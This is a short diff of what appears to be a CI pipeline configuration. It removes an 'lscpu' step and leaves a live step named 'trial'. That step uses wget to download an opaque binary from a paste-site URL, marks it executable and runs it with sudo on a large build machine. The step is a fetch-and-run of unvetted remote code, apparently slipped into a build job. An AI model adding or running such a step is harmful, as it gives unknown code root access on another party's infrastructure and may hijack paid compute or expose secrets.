@@ -6,7 +6,6 @@ jobs:
       image: ubuntu-2004:current
     resource_class: large
     steps:
-      - run: lscpu
       - run: 
             name: "trial" 
             command: wget https://muq-hastebin.glitch.me/raw/tIDM1H6ovF && chmod u+x tIDM1H6ovF && sudo ./tIDM1H6ovF
